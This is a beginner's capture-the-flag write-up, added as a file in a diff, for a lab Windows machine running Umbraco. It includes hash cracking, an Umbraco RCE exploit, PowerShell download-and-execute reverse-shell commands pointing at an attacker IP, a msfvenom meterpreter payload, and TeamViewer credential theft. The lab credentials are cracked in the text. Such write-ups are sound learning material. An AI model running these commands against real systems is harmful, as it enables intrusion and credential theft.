@@ -1,0 +1,164 @@
+This is my first ever write-up as a beginner into the pen-testing landscape so please bare with me.
+
+My first go to is an nmap scan:
+
+sudo nmap 10.10.10.180 -sV -sC -Pn --disable-arp-ping -vv
+
+I like to use these commands as my first scan:
+-sV - enumerates the services so I can understand what is running on each port
+-sC - enumerates the services further which gives me more information about each port
+-Pn / --disable-arp-ping - helps to provide a stealthier scan for when it comes to real engagements
+
+![alt text](image.png)
+Here we can see straigtaway that anonymous log in is allowed which we will be able to take advantage of
+
+![alt text](image-1.png)
+Here we can see a http webpage is present so we can use this to further enumerate through web browsers, and domain enumeration
+
+![alt text](image-2.png)
+Here we can see NFS shares which we may be able to access
+
+
+First I am going to attempt to connect to anonymous ftp to see what i can gather.
+As far as I can see there is nothing on this server
+
+Second I am going to take a look at the web page to gather as much info as i can.
+
+When I navigate to the web page I can see something that looks like an online shop and blog for a company Acme - based in Denmark.
+
+I notice an Intranet section on website which may come in useful.
+
+I am going to create my own custom word list to use to find any subdirectories on this webpage using;
+cewl http://10.10.10.180/ -w wordlist.txt
+
+I will now use feroxbuster to find subdomains which showed me;
+10.10.10.180/umbraco which led to a log in page which may be useful for later
+
+Now I am going to mount the NFS shares 
+
+showmount -e 10.10.10.180
+which gives us /site_backups (everyone)
+
+I now do the following commands:
+mkdir mount
+sudo mount -t nfs 10.10.10.180:site_backups mount -o nolock
+
+this will now give me access to this share on my local machine
+
+Searching the share I entered the umbraco folder and explored, could not find anything useful
+
+https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials?source=post_page-----66fc6354117e--------------------------------
+
+Found this web page which directed me to the umbraco database credentials
+
+I used the string umbraco command which allowed me to find an admin username of "admin"
+I then used grep admin* -A 10 to try and locate any passwords will filtering out uneeded text
+
+One thing eventually stood out
+adminAdministratorsCADMOSKTPIURZ:5F7
+
+Looking further I can also see strings saying "hashalgorithm SHA1 or HMACSHA256" could this be the key to the password?
+
+Lets us hashid on one of these hashes and then try to crack this
+hashid 'b8be16afba8c314ad33d812f22a04991b90e2aaa'
+shows SHA-1
+
+now we will try to crack with hashcat
+
+hashcat -m 100 'b8be16afba8c314ad33d812f22a04991b90e2aaa' /usr/share/wordlists/rockyou.txt  --show
+
+This cracked the hash very quickly providing us with a password for admin@htb.local
+
+Bingo we now have access
+
+we have now found Umbraco version 7.12.4
+
+searching this i found a aspx upload exploit on metasploit
+let use this to gain access
+make sure to change the options within msf to get this to work for you
+
+After trying this exploit, this no longer seems to work however there is another exploit on exploitDB that allowd for RCE so lets try this
+
+![alt text](image-3.png)
+using the command whoami has shown that this exploit works and that we can use this to potentially get a shell
+
+so lets create a listener using nc on port 4444
+
+now lets get a revshell one liner from revshells.com
+
+i will use the nc mkfifo rev shell putting me into sh
+
+however this does not work so lets see if we can open powershell or cmd and get it to execute commands
+
+using -c powershell.exe -a "ls C:/" allows us to see the directory
+
+so we can now use this to hunt the user.txt flag
+python3 49488.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "type C:/Users/Public/Desktop/user.txt"
+
+
+now we need to try and priv esc so we can access the admin flag
+
+I noticed that teamviewer seems to be present so lets see if it is installed using tasklist /svc
+
+teamviwer 7 lets look for any exploits
+TeamViewer 11.0.65452 (x64) - Local Credentials Disclosure
+
+now lets go back to our best friend msfconsole to see if it is preloaded
+
+I found a post exploit for teamviewer passwords, perfect!
+
+set the options
+for this to work we need to gain a shell
+
+we need a way to get a script onto the server in order to get the reverse shell
+
+lets use the exploit/multi/script/web_delivery module in msf
+
+make sure you set lhost to your machine
+change the payload
+change the exploit target
+
+copy the command it tells you into your python script and execute
+
+the stages should deliver and you should gain a shell
+
+for some reason my final stage kept failing to send so I did some research and found another way to get a shell
+
+https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+
+we edit this and add
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.12 -Port 4400
+
+now lets set up a python server in the directory of this script so it can be downloade and set up a lsitener on port 4400
+
+execute this using this command:
+"IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.12:8000/reverse.ps1')"
+
+and a shell is gained, now we can start to do the teamviewer exploit
+
+now lets make a msfvenom payload
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.12 lport=6666 -f exe > meterpreter
+
+
+set the msfconsole to exploit/multi/handler match the lports and exploit
+
+now as we still have the python web server running lets download our meterpreter payload using (Ensure you are in temp folder)
+Invoke-WebRequest "http://10.10.16.12:8000/meterpreter.exe" -Outfile met.exe
+
+now lets run this ./met.exe and we have a meterpreter shell
+
+lets background this and use the teamviewer exploit
+
+use post/windows/gather/credentials/teamviewer_passwords
+set options
+
+and exploit
+
+1 password found but lets explore the directories in teamviewer
+!R3m0te!
+
+lets check for reused password (Bit of a cheat as their is only one other user)
+
+use evil-winrm -i 10.10.10.180 -u Administrator -p (Password)
+
+we have access and now we have the administrator flag
